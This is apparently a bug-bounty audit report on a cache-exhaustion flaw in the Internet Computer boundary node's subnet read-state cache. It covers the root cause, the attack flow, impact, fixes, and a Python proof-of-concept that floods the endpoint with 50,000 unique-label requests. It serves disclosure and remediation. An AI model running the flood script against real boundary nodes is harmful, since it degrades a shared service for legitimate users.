Audit Report

## Title
Unbounded Cache Key Space Enables Shared Subnet Read-State Cache Exhaustion by Unprivileged Client — (`rs/boundary_node/ic_boundary/src/http/middleware/subnet_read_state_cache.rs`)

## Summary
The `subnet_read_state_cache` on boundary nodes accepts cache insertions keyed on `(SubnetId_from_URL, ReadStatePaths_from_body)` with no per-client quota and no validation that the second path labels correspond to registered subnet IDs. An unprivileged attacker can send a sustained stream of requests to a real subnet's read-state endpoint with counter-incremented body path labels, filling the 10 MB cache with unique but useless entries and evicting all legitimate routing-table entries, forcing every subsequent legitimate client to incur a full replica round-trip for the duration of the 30-second TTL window.

## Finding Description

**Cache key construction.** `CacheKey` is `(SubnetId, ReadStatePaths)` where `ReadStatePaths` is a sorted `Vec<Vec<Vec<u8>>>` derived entirely from the request body. [1](#0-0) [2](#0-1) 

**Cacheability gate.** `should_cache_paths` admits a request if and only if it has exactly 2 paths each with exactly 2 labels, the first labels are `"canister_ranges"` and `"subnet"` in either order, and the second labels are `≤ Principal::MAX_LENGTH_IN_BYTES` (29 bytes). The second labels are **not** validated against known subnet IDs — any arbitrary byte sequence up to 29 bytes passes. [3](#0-2) 

**Middleware execution order.** In `subnet_layers`, `middleware_subnet_read_state_cache` is stacked *before* `middleware_subnet_lookup`. On a cache miss the request proceeds to the subnet lookup; if the URL subnet_id is a registered subnet (e.g., NNS), the lookup succeeds and the request is forwarded to the replica. [4](#0-3) 

**Unconditional cache insertion.** On a cache miss, if the upstream response is HTTP 200 and the body is within `max_item_size`, the response is inserted with no per-client accounting. [5](#0-4) 

**URL subnet_id validation.** `validate_subnet_request` only checks that the URL subnet_id is a syntactically valid principal; it does not verify it is a registered subnet. The attacker uses a real, publicly known subnet_id (e.g., NNS) so the downstream `lookup_subnet_by_id` call succeeds. [6](#0-5) [7](#0-6) 

**No default rate limiting on subnet routes.** The bouncer (`--bouncer-enable`) is opt-in and disabled by default. The generic limiter is also opt-in. Neither is applied to subnet read-state routes by default. [8](#0-7) 

**Default cache capacity.** 10 MB total, 1 MB per item, TTL 30 s. [9](#0-8) 

**Attack flow:**
1. Pick any registered subnet_id for the URL (NNS subnet principal is publicly known).
2. Craft CBOR bodies with paths `[["canister_ranges", <N>], ["subnet", <N>]]` where `<N>` is a counter-incremented byte string ≤ 29 bytes. Each value of `N` produces a distinct `CacheKey`.
3. Each request passes `should_cache_paths`, misses the cache, reaches the NNS replica (subnet lookup succeeds), and the replica returns HTTP 200 with a valid certificate (the IC read-state endpoint returns HTTP 200 with an absent-value certificate even for non-existent path labels).
4. The response is inserted into the cache under the unique key.
5. After ~10,000–50,000 requests (depending on response size), moka's weighted eviction begins discarding legitimate entries.
6. Legitimate clients querying real routing-table data (`canister_ranges`/`subnet` for real subnet IDs) now miss the cache and must wait for replica round-trips on every request for the next 30 s TTL window.

## Impact Explanation
All boundary-node clients that rely on the subnet read-state cache for routing-table lookups experience elevated latency and increased replica load for the duration of the attack. The attacker must sustain ~10 MB/30 s of unique requests to keep the cache exhausted. The service remains functional (replicas still answer), but the caching invariant is violated. This is an application/platform-level DoS on the boundary node caching layer that is not based on raw volumetric DDoS — it exploits a specific unbounded key-space vulnerability to achieve a disproportionate effect. This matches the **High ($2,000–$10,000)** impact class: *Application/platform-level DoS, crash, consensus blocking, certified-state disruption, or subnet availability impact not based on raw volumetric DDoS.*

## Likelihood Explanation
The attack requires only a valid subnet principal (publicly known), a CBOR library, and a network connection. No authentication, no privileged role, no key material. The only mitigations (bouncer, generic rate limiter) are disabled by default. The attack is fully local-testable and repeatable every 30 s TTL window.

## Recommendation
- Add a per-client (per-IP or per-sender) insertion quota or a global insertion-rate cap for the subnet read-state cache.
- Restrict cacheable second path labels to byte sequences that parse as **known, registered** subnet IDs validated against the live routing snapshot, reducing the key space to the finite set of real subnets (~O(tens) of entries).
- Enable the bouncer by default or add a hard rate limit on the subnet read-state endpoint independent of the generic limiter.

## Proof of Concept

```python
import cbor2, requests, struct

BOUNDARY = "https://<boundary_node>"
NNS_SUBNET = "<nns_subnet_principal>"  # publicly known

for n in range(50_000):
    label = struct.pack(">I", n).ljust(4, b'\x00')  # 4-byte unique label ≤ 29 bytes
    body = cbor2.dumps({
        "content": {
            "request_type": "read_state",
            "sender": bytes(1),       # anonymous
            "ingress_expiry": 2**63,
            "paths": [
                [b"canister_ranges", label],
                [b"subnet",          label],
            ]
        }
    })
    requests.post(
        f"{BOUNDARY}/api/v2/subnet/{NNS_SUBNET}/read_state",
        data=body,
        headers={"Content-Type": "application/cbor"},
    )
# After ~50k requests the cache is full of unique useless entries.
# Measure hit rate for legitimate canister_ranges/subnet queries → ~0%.
```

A deterministic integration test can be written using the existing `setup_app` / `make_request` test harness in `subnet_read_state_cache.rs`: insert entries with 50,000 distinct path-label values against a 10 MB cache and assert that a previously cached legitimate entry is subsequently a miss. pub(crate) fn should_cache_paths(paths: &[Vec<Blob>]) -> bool {
    // Check that we have correct lengths
    if paths.len() != 2 || paths.iter().any(|x| x.len() != 2) {
        return false;
    }

    // Check that 2nd labels are short enough to be Principals
    if !paths
        .iter()
        .all(|x| x[1].0.len() <= Principal::MAX_LENGTH_IN_BYTES)
    {
        return false;
    }

    // Check that we have a correct combination of 1st labels.
    // This looks a bit ugly, but efficient.
    [
        (&b"canister_ranges"[..], &b"subnet"[..]),
        (&b"subnet"[..], &b"canister_ranges"[..]),
    ]
    .contains(&(&paths[0][0].0[..], &paths[1][0].0[..]))
}
